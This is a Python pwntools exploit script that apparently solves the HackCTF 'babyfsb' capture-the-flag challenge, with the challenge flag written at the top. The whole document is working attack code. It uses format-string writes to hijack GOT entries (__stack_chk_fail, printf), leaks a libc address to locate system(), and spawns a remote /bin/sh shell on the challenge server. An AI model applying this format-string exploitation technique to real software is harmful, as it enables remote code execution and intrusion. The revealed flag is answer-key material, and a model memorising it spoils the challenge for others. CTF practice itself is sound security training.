#HackCTF{v3ry_v3ry_345y_f5b!!!}
from pwn import *
import binascii
# s = process("./babyfsb")
s = remote("ctf.j0n9hyun.xyz", 3032)
elf = ELF("./babyfsb")
libc = ELF("./libc.so.6")
context.clear(arch = 'amd64')#,log_level="DEBUG")
raw_input("Fast and Furious\n")

n = 6
stack_protect = elf.got['__stack_chk_fail']
setvbuf = elf.got['setvbuf']
printf = elf.got['printf']
bss_start = 0x601058
main =  elf.sym.main
one_gg = 0x4f432
_start =  0x4005b0

pl = fmtstr_payload(6,{stack_protect:main})
pl = pl.ljust(0x40,"a")
s.send(pl)

pl = "# %25$p"
pl = pl.ljust(0x40,"a")
s.send(pl)

s.recvuntil("# ")
leak = s.recv(14)
leak = int(leak,16)
libc.address = leak - 0x020830# - libc.symbols['__libc_start_main'] -231
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))
one = libc.address + one_gg

pl = fmtstr_payload(6,{stack_protect:main})
pl = pl.ljust(0x39,"a")
s.send(pl)

h_sys1 = hex(system)[0:8]
h_sys1 = int(h_sys1,16)
h_sys = "0x" + hex(system)[8:10]
h_sys = int(h_sys,16)
l_sys = "0x" + hex(system)[10:14]
l_sys = int(l_sys,16)


log.info("libc_start_main_ret = {}".format(hex(leak)))
log.info("libc.address = {}".format(hex(libc.address)))
log.info("system = {}".format(hex(system)))
log.info("binsh = {}".format(hex(binsh)))
log.info("one_gadget = {}".format(hex(one)))
log.info("h_sys = {}".format(hex(h_sys)))
log.info("l_sys = {}".format(hex(l_sys)))

sleep(3)
pl = "%" + str(l_sys) + "x%11$hnaaa"
pl += "%" + str((h_sys+0x1000000-3-l_sys)) + "x%12$hhnaaaaaaa"
pl += p64(printf)
pl += p64(printf+2)
pl = pl.ljust(0x40,"a")
s.send(pl)

s.sendline("/bin/sh\x00")

s.interactive() 